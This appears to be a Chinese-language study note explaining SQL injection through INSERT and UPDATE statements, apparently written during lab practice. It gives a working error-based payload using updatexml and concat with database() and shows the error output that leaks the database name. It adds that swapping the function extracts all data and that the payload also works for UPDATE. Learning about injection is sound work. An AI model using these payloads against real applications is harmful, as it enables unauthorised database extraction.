---
title: "insert、update注入"
date: 2024-07-24
---
---

# insert、update 注入

## 原理

前端的输入可以直接拼接到后端的`insert、update`命令

## 命令

```sql
# insert命令
insert into member(username,pw,sex,phonenum,email,address) values('xxx',1,2,3,4,5);
```

`values('xxx',1,2,3,4,5)`括号内的数据没有经过处理直接拼接会造成 sql 注入漏洞

```sql
# 我们需要构造的命令
insert into member(username,pw,sex,phonenum,email,address) values('1' or updatexml(1,concat(0x7e,database()),0) or '',1,2,3,4,5);

# payload就是原来xxx的位置:
1' or updatexml(1,concat(0x7e,database()),0) or '

# 输入payload，返回结果：
XPATH syntax error: '~root'
```

- `or`判断会把左右的表达式先执行一遍
- 执行`updatexml()`函数时利用函数报错获取信息
- 接下来替换`database()`位置的命令就能得到数据库的全部数据(见**_基于函数报错的信息获取.md_**)
- ~~怎么会有个跳转连接,`.md`后缀被认为是网站了吗？~~
- `update`和`insert`一样，payload 通用
